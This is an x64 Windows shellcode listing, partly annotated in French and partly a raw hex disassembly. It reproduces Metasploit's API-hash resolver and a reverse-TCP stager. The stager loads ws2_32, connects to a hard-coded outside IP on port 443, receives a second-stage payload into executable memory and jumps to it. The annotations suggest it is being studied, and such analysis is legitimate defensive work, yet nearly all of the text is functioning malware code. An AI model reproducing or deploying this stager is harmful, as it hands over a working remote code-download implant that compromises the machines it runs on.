

_start:
    cld
    and rsp,byte -0x10
    call save_beginning

metasploit_block_api
    push r9
    push r8
    push rdx
    push rcx
    xor rdx,rdx
    mov rdx,[gs:rdx+0x60]
    push rsi
    mov rdx,[rdx+0x18]
    mov rdx,[rdx+0x20]

load_module_name
    xor r9,r9
    mov rsi,[rdx+0x50]
    movzx rcx,word [rdx+0x4a]

module_hash_loop:
    xor rax,rax
    lodsb
    cmp al,0x61
    jl skip_case_adjustment
    sub al,0x20
skip_case_adjustment:
    ror r9d,0xd
    add r9d,eax
    loop module_hash_loop

is_valid_module:
    push rdx
    push r9
    mov rdx,[rdx+0x20]
    mov eax,[rdx+0x3c]
    add rax,rdx
    cmp word [rax+0x18],0x20b
    jnz load_next_module

    mov eax,[rax+0x88]  ; offset de IMAGE_EXPORT_DIRECTORY
    test rax,rax
    jz load_next_module

    add rax,rdx
    mov r8d,[rax+0x20]
    mov ecx,[rax+0x18]
    push rax            ; On sauvegarde l'adresse de IMAGE_EXPORT_DIRECTORY
    add r8,rdx

find_function:
    jrcxz pre_load_next_module
    dec rcx
    xor r9,r9
    mov esi,[r8+rcx*4]
    add rsi,rdx

function_hash_loop
    xor rax,rax
    ror r9d,0xd
    lodsb
    add r9d,eax
    cmp al,ah
    jnz function_hash_loop

check:
    add r9,[rsp+0x8]
    cmp r9d,r10d
    jnz find_function

final:
    pop rax
    mov r8d,[rax+0x24]
    add r8,rdx
    mov cx,[r8+rcx*2]
    mov r8d,[rax+0x1c]
    add r8,rdx
     mov eax,[r8+rcx*4]
    add rax,rdx
    pop r8
    pop r8
    pop rsi
    pop rcx
    pop rdx
    pop r8
    pop r9
    pop r10
    sub rsp,byte +0x20
    push r10
    jmp rax

pre_load_next_module
    pop rax
load_next_module
    pop r9
    pop rdx
    mov rdx,[rdx]
    jmp load_module_name

save_beginning:
    pop rbp      ; rbp = @->beginning (metasploit_block_api)
    mov r14,0x32335f327377
    push r14
    mov r14,rsp  ; @ -> chaine au dessus
    sub rsp,0x1a0
    mov r13,rsp
    mov r12,0x2e297225bb010002
    push r12
    mov r12,rsp
    mov rcx,r14
    mov r10d,0x726774c   ; Hash de kernel32.LoadLibraryA 
    call rbp             ; Premiere run de l'api
    mov rdx,r13
    push qword 0x101
    pop rcx
    mov r10d,0x6b8029   ; Hash de ???
    call rbp            ; 2eme run
    push byte +0xa
    pop r14
    push rax
    push rax
    xor r9,r9
    xor r8,r8
    inc rax
    mov rdx,rax
    inc rax
    mov rcx,rax
    mov r10d,0xe0df0fea ; Hash de ???
    call rbp            ; 3eme run  XXX.YYYY(
    mov rdi,rax
    push byte +0x10
    pop r8
    mov rdx,r12
     mov rcx,rdi
    mov r10d,0x6174a599 ; Hash de ???
    call rbp            ; 4eme run
    test eax,eax
00000152  740A              jz 0x15e
00000154  49FFCE            dec r14
00000157  75E5              jnz 0x13e
00000159  E893000000        call 0x1f1
0000015E  4883EC10          sub rsp,byte +0x10
00000162  4889E2            mov rdx,rsp
00000165  4D31C9            xor r9,r9
00000168  6A04              push byte +0x4
0000016A  4158              pop r8
0000016C  4889F9            mov rcx,rdi
0000016F  41BA02D9C85F      mov r10d,0x5fc8d902
00000175  FFD5              call rbp
00000177  83F800            cmp eax,byte +0x0
0000017A  7E55              jng 0x1d1
0000017C  4883C420          add rsp,byte +0x20
00000180  5E                pop rsi
00000181  89F6              mov esi,esi
00000183  6A40              push byte +0x40
00000185  4159              pop r9
00000187  6800100000        push qword 0x1000
0000018C  4158              pop r8
0000018E  4889F2            mov rdx,rsi
00000191  4831C9            xor rcx,rcx
00000194  41BA58A453E5      mov r10d,0xe553a458
0000019A  FFD5              call rbp
0000019C  4889C3            mov rbx,rax
0000019F  4989C7            mov r15,rax
000001A2  4D31C9            xor r9,r9
000001A5  4989F0            mov r8,rsi
000001A8  4889DA            mov rdx,rbx
000001AB  4889F9            mov rcx,rdi
000001AE  41BA02D9C85F      mov r10d,0x5fc8d902
000001B4  FFD5              call rbp
000001B6  83F800            cmp eax,byte +0x0
000001B9  7D28              jnl 0x1e3
000001BB  58                pop rax
000001BC  4157              push r15
000001BE  59                pop rcx
000001BF  6800400000        push qword 0x4000
000001C4  4158              pop r8
000001C6  6A00              push byte +0x0
000001C8  5A                pop rdx
000001C9  41BA0B2F0F30      mov r10d,0x300f2f0b
000001CF  FFD5              call rbp
000001D1  57                push rdi
000001D2  59                pop rcx
000001D3  41BA756E4D61      mov r10d,0x614d6e75
000001D9  FFD5              call rbp
000001DB  49FFCE            dec r14
000001DE  E93CFFFFFF        jmp 0x11f
000001E3  4801C3            add rbx,rax
000001E6  4829C6            sub rsi,rax
000001E9  4885F6            test rsi,rsi
000001EC  75B4              jnz 0x1a2
000001EE  41FFE7            jmp r15
000001F1  58                pop rax
000001F2  6A00              push byte +0x0
000001F4  59                pop rcx
000001F5  49C7C2F0B5A256    mov r10,0x56a2b5f0
000001FC  FFD5              call rbp
